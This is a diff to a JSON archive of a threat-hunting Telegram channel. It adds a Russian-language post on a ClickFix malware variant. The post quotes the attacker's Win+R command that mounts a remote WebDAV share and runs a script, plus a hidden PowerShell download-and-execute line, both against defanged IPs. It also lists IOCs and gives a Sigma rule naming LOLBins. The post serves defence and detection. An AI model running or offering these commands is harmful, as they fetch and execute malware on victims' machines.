@@ -1,14 +1,21 @@
 {
   "channel": "ThreatHuntingFather",
-  "last_update": "2026-03-17T05:23:58.273670+00:00",
-  "messages_count": 150,
+  "last_update": "2026-03-17T10:00:48.150184+00:00",
+  "messages_count": 151,
   "messages": [
     {
       "id": "1229",
       "title": "Message 1229",
       "text": "\n\n[Media: Видео]",
       "link": "https://t.me/ThreatHuntingFather/1229",
-      "pub_date": "2026-03-17T05:23:58.259920+00:00"
+      "pub_date": "2026-03-17T10:00:48.134274+00:00"
+    },
+    {
+      "id": "1232",
+      "title": "New Click-Fix Variant (Cloudflare Win + R)",
+      "text": "New Click-Fix Variant (Cloudflare Win + R)\nИсследователи Atos зафиксировали новый вариант техники ClickFix, в котором злоумышленники убеждают пользователя выполнить вредоносную команду через диалог Win + R.\nВ отличие от предыдущих итераций, где использовались PowerShell или MSHTA, здесь применяется net use для монтирования удалённого WebDAV-диска с последующим запуском .cmd скрипта с этого диска:\ncmd.exe /c net use Z: http://94.156.170[.]255/webdav /persistent:no\n&& \"Z:\\update.cmd\" & net use Z: /delete\nupdate.cmd запускает скрытый PowerShell, скачивает ZIP-архив и распаковывает его:\npowershell\npowershell -WindowStyle Hidden -Command\n\"Invoke-WebRequest 'http://94.156.170[.]255/flowy.zip'\n-OutFile $env:TEMP\\dl.zip;\nExpand-Archive $env:TEMP\\dl.zip\n-DestinationPath $env:LOCALAPPDATA\\MyApp -Force;\nStart-Process $env:LOCALAPPDATA\\MyApp\\WorkFlowy.exe\"\nАрхив содержит легитимное приложение WorkFlowy (Electron, v1.4.1050), подписанное разработчиком. Вредоносный код внедрён в main.js внутри app.asar - формата, который крайне редко проверяется средствами защиты.\nПосле запуска малварь:\n🔁 Каждые 2 секунды отправляет POST-запрос на C2 с именем машины, юзернеймом и уникальным victim ID\n💾 Сохраняет victim ID в %APPDATA%\\id.txt для трекинга между сессиями\n📦 Получает и исполняет полезную нагрузку через child_process.exec из %TEMP%\\[unix_timestamp]\\\nC2: cloudflare[.]report/forever/e/\nStaging IP: 144[.]31[.]165[.]173 (Frankfurt, AS215439)\n🧬 IOCs: 94[.]156[.]170[.]255 • 144[.]31[.]165[.]173 • cloudflare[.]report • happyglamper[.]roa390fe045f50a0697b14160132dfa124c7f92d85c18fba07df351c2fcfc11063 (app.asar)\n🛡 Detection: Hunting Query\ntitle: Suspicious Commands executed via Run dialog\nid: 20891a30-032e-4f15-a282-fa4a8b0d8aae\nstatus: experimental\ndescription: Detects suspicious command interpreters and LOLBins written into the Explorer RunMRU registry key (commonly used for Run dialog history), with explorer.exe as the initiating process.\nauthor: TRC\ndate: 2026-03-05\ntags:\n– attack.execution\n– attack.t1059\n– attack.defense_evasion\nlogsource:\ncategory: registry_set\nproduct: windows\ndefinition: “Sysmon Event ID 13 (Registry value set) or equivalent EDR registry telemetry”\ndetection:\nselection_key:\nTargetObject|contains:‘\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU’\nselection_proc:\nImage|endswith: ‘\\explorer.exe’\nselection_data:\nDetails|contains:\n– ‘cmd ‘\n– ‘powershell ‘\n– ‘cmd.exe ‘\n– ‘powershell.exe ‘\n– ‘wscript.exe ‘\n– ‘cscript.exe ‘\n– ‘net.exe ‘\n– ‘net1.exe ‘\n– ‘sh.exe ‘\n– ‘bash.exe ‘\n– ‘schtasks.exe ‘\n– ‘regsvr32.exe ‘\n– ‘hh.exe ‘\n– ‘wmic.exe ‘\n– ‘mshta.exe ‘\n– ‘rundll32.exe ‘\n– ‘msiexec.exe ‘\n– ‘forfiles.exe ‘\n– ‘scriptrunner.exe ‘\n– ‘mftrace.exe ‘\n– ‘AppVLP.exe ‘\n– ‘svchost.exe ‘\n– ‘msbuild.exe ‘\ncondition: selection_key and selection_proc and selection_data\nfalsepositives:\n– “Legitimate administrative activity using Run dialog (Win+R) to execute built-in tools.”\n– “IT scripts or troubleshooting steps executed interactively by a user.”\nlevel: medium\n🔗 https://atos.net/en/lp/cybershield/investigating-a-new-click-fix-variant\n🦔 THF\n\n[Media: Фото]",
+      "link": "https://t.me/ThreatHuntingFather/1232",
+      "pub_date": "2026-03-17T08:09:47+00:00"
     },
     {
       "id": "1231",
